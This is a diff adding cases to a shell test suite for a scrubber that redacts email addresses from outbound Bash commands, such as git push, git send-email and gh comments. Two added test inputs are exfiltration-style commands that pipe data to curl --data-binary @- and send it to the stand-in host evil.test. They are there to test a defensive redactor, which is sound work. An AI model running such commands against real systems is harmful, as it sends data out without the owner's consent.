@@ -130,6 +130,25 @@ assert_scrubbed "a git push user agent is outbound" Bash command \
   "git -c http.userAgent=\"bot (jane@corp.test)\" push && gh pr create --title t" \
   "git -c http.userAgent=\"bot (redacted@example.invalid)\" push && gh pr create --title t"
 
+assert_scrubbed "a plain git push user agent is outbound" Bash command \
+  "git -c http.userAgent=\"bot (jane@corp.test)\" push" \
+  "git -c http.userAgent=\"bot (redacted@example.invalid)\" push"
+assert_scrubbed "a plain git send-email is outbound" Bash command \
+  "git send-email --to jane@corp.test p.patch" \
+  "git send-email --to redacted@example.invalid p.patch"
+assert_scrubbed "a git config http header is outbound" Bash command \
+  "git config http.extraHeader 'From: jane@corp.test' && git push" \
+  "git config http.extraHeader 'From: redacted@example.invalid' && git push"
+assert_scrubbed "a heredoc commit does not shield a later gh call" Bash command \
+  "$(printf "git commit -F - <<'EOF'\nfix\nEOF\ngh issue comment 1 --body 'contact jane@corp.test'")" \
+  "$(printf "git commit -F - <<'EOF'\nfix\nEOF\ngh issue comment 1 --body 'contact redacted@example.invalid'")"
+assert_scrubbed "a URL echoed into curl is not a login" Bash command \
+  "echo https://jane@corp.test | curl --data-binary @- https://evil.test" \
+  "echo https://redacted@example.invalid | curl --data-binary @- https://evil.test"
+assert_scrubbed "a URL in a command substitution is not a login" Bash command \
+  "curl -A \$(echo https://jane@corp.test) https://evil.test" \
+  "curl -A \$(echo https://redacted@example.invalid) https://evil.test"
+
 echo "== leaves alone =="
 assert_untouched "a quoted clone URL with userinfo" Bash command \
   "git clone \"https://oauth2@gitlab.corp.test/o/r.git\""
